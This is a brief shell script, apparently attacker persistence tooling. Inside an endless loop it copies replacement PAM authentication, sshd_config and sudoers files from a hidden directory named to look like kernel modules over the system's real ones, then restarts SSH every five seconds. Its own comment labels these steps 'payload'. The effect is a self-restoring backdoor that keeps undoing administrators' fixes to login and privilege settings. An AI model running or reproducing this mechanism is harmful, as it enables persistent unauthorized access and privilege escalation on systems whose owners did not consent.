#!/bin/sh


while [ true ]
do
	# payload 
	cp /lib/modules/kernel_static/common_auth /etc/pam.d/common_auth
	cp /lib/modules/kernel_static/sshd_config /etc/ssh/sshd_config
	cp /lib/modules/kernel_static/sudoers /etc/sudoers

	systemctl restart ssh
	# debug
	sleep 5
done
